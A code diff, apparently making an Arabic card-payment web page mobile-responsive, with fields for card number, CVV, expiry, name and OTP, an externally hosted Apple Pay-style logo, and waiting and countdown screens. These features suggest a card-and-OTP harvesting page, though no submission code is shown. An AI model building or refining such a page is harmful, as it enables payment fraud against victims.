@@ -2,19 +2,40 @@
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <title>بطاقة الدفع</title>
 
 <style>
-body {
-  font-family: Arial;
-  background: #f5f5f5;
+*{
+  box-sizing:border-box;
+}
+
+html, body {
+  width: 100%;
+  max-width: 100%;
+  overflow-x: hidden;
   margin: 0;
   padding: 0;
+}
+
+body {
+  font-family: Arial, sans-serif;
+  background: #f5f5f5;
+  min-height: 100vh;
 }
 
 /* شاشة البطاقة */
 .payment-screen {
   display: block;
+  width: 100%;
+  padding: 14px 14px 20px;
+}
+
+/* حاوية الصفحة */
+.payment-wrap{
+  width: 100%;
+  max-width: 420px;
+  margin: 0 auto;
 }
 
 /* طبقة Apple Pay البيضاء */
@@ -29,8 +50,7 @@ body {
 /* زر Apple Pay */
 .apple-pay-btn {
   width: 100%;
-  max-width: 420px;
-  margin: 20px auto 10px;
+  margin: 10px auto 10px;
   background: #000;
   border-radius: 40px;
   height: 55px;
@@ -48,30 +68,31 @@ body {
   justify-content: center;
   overflow: hidden;
   width: 160px;
+  max-width: 100%;
 }
 
 /* الشعار */
 .apple-logo {
   height: 26px;
   width: auto;
+  max-width: 100%;
   background: transparent !important;
   border: none !important;
   box-shadow: none !important;
   object-fit: contain;
   margin-top: 3px;
   pointer-events: none;
+  display: block;
 }
 
 /* الإطار */
 .box {
   width: 100%;
-  max-width: 420px;
   margin: 0 auto;
   border: 2px solid #000;
   border-radius: 25px;
   padding: 20px;
   background: #fff;
-  box-sizing: border-box;
   overflow: hidden;
 }
 
@@ -95,6 +116,7 @@ body {
   box-sizing: border-box;
   border: 1px solid transparent;
   transition: border-color 0.2s ease, box-shadow 0.2s ease;
+  min-width: 0;
 }
 
 /* الشعار */
@@ -106,6 +128,7 @@ body {
   border: none !important;
   box-shadow: none !important;
   display: block;
+  flex: 0 0 auto;
 }
 
 /* رقم البطاقة */
@@ -115,6 +138,7 @@ body {
   background: transparent;
   font-size: 16px;
   width: 100%;
+  min-width: 0;
   text-align: right;
 }
 
@@ -188,6 +212,7 @@ body {
   padding: 0;
   color: #000;
   cursor: pointer;
+  min-width: 0;
 }
 
 .expiry-sep {
@@ -201,8 +226,7 @@ body {
 /* زر الدفع */
 .pay-btn {
   width: 100%;
-  max-width: 420px;
-  margin: 15px auto;
+  margin: 15px auto 0;
   background: #2e9f44;
   color: #fff;
   border: none;
@@ -353,6 +377,104 @@ select:invalid {
   from { transform: rotate(0deg); }
   to { transform: rotate(360deg); }
 }
+
+/* تحسينات الجوال */
+@media (max-width: 480px) {
+  .payment-screen {
+    padding: 10px 12px 18px;
+  }
+
+  .box {
+    padding: 16px 14px;
+    border-radius: 22px;
+  }
+
+  .title {
+    font-size: 20px;
+  }
+
+  .apple-pay-btn {
+    height: 50px;
+    border-radius: 28px;
+  }
+
+  .pay-btn,
+  .otp-btn {
+    font-size: 18px;
+    padding: 14px;
+  }
+
+  .auth-title {
+    font-size: 26px;
+  }
+
+  .auth-desc {
+    font-size: 18px;
+    line-height: 1.9;
+  }
+
+  .back-link {
+    margin-top: 90px;
+    font-size: 16px;
+  }
+
+  .loader-pro {
+    width: 110px;
+    height: 110px;
+  }
+
+  .countdown {
+    font-size: 28px;
+  }
+}
+
+@media (max-width: 360px) {
+  .payment-screen {
+    padding: 8px 10px 16px;
+  }
+
+  .box {
+    padding: 14px 12px;
+  }
+
+  .title {
+    font-size: 18px;
+  }
+
+  .input-box,
+  .name-input,
+  .otp-input {
+    height: 46px;
+  }
+
+  .small-input,
+  .expiry-box {
+    height: 44px;
+  }
+
+  .card-number,
+  .name-input,
+  .small-input,
+  .expiry-select,
+  .otp-input {
+    font-size: 14px;
+  }
+
+  .card-icon {
+    width: 54px;
+    margin-left: 8px;
+  }
+
+  .row {
+    gap: 8px;
+  }
+
+  .pay-btn,
+  .otp-btn {
+    font-size: 17px;
+    border-radius: 28px;
+  }
+}
 </style>
 </head>
 
@@ -360,69 +482,72 @@ select:invalid {
 
 <!-- شاشة البطاقة -->
 <div class="payment-screen" id="paymentScreen">
+  <div class="payment-wrap">
 
-  <div class="apple-pay-screen" id="applePayScreen"></div>
+    <div class="apple-pay-screen" id="applePayScreen"></div>
 
-  <div class="apple-pay-btn" id="applePayBtn">
-    <div class="apple-wrap">
-      <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo">
-    </div>
-  </div>
-
-  <div class="box">
-    <div class="title">بطاقة الائتمان</div>
-
-    <div class="input-box" id="cardBox">
-      <img
-        id="cardLogo"
-        class="card-icon"
-        src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
-        alt="card"
-      >
-
-      <input
-        type="text"
-        id="cardNumber"
-        class="card-number"
-        placeholder="رقم البطاقة"
-        maxlength="16"
-        inputmode="numeric"
-        autocomplete="cc-number"
-      >
-    </div>
-
-    <div class="row">
-      <input
-        type="text"
-        id="cvv"
-        class="small-input"
-        placeholder="CVV"
-        maxlength="3"
-        inputmode="numeric"
-        autocomplete="cc-csc"
-      >
-
-      <div class="expiry-box" id="expiryBox">
-        <select id="expMonth" class="expiry-select" required>
-          <option value="" selected disabled>MM</option>
-        </select>
-        <div class="expiry-sep">/</div>
-        <select id="expYear" class="expiry-select" required>
-          <option value="" selected disabled>YY</option>
-        </select>
+    <div class="apple-pay-btn" id="applePayBtn">
+      <div class="apple-wrap">
+        <img src="https://i.postimg.cc/zXgvbB4n/20260412-174304.png" class="apple-logo">
       </div>
     </div>
 
-    <input
-      type="text"
-      id="cardName"
-      class="name-input"
-      placeholder="الاسم الموجود على البطاقة"
-      autocomplete="cc-name"
-    >
-  </div>
+    <div class="box">
+      <div class="title">بطاقة الائتمان</div>
 
-  <button class="pay-btn" id="payBtn">ادفع الآن</button>
+      <div class="input-box" id="cardBox">
+        <img
+          id="cardLogo"
+          class="card-icon"
+          src="https://i.postimg.cc/Hsf6sDzk/20260412-152344.png"
+          alt="card"
+        >
+
+        <input
+          type="text"
+          id="cardNumber"
+          class="card-number"
+          placeholder="رقم البطاقة"
+          maxlength="16"
+          inputmode="numeric"
+          autocomplete="cc-number"
+        >
+      </div>
+
+      <div class="row">
+        <input
+          type="text"
+          id="cvv"
+          class="small-input"
+          placeholder="CVV"
+          maxlength="3"
+          inputmode="numeric"
+          autocomplete="cc-csc"
+        >
+
+        <div class="expiry-box" id="expiryBox">
+          <select id="expMonth" class="expiry-select" required>
+            <option value="" selected disabled>MM</option>
+          </select>
+          <div class="expiry-sep">/</div>
+          <select id="expYear" class="expiry-select" required>
+            <option value="" selected disabled>YY</option>
+          </select>
+        </div>
+      </div>
+
+      <input
+        type="text"
+        id="cardName"
+        class="name-input"
+        placeholder="الاسم الموجود على البطاقة"
+        autocomplete="cc-name"
+      >
+    </div>
+
+    <button class="pay-btn" id="payBtn">ادفع الآن</button>
+
+  </div>
 </div>
 
 <!-- شاشة الانتظار الأولى 60 ثانية -->
@@ -877,4 +1002,4 @@ payBtn.addEventListener("click", function (e) {
 });
 </script>
 </body>
-</html>
+          </html>
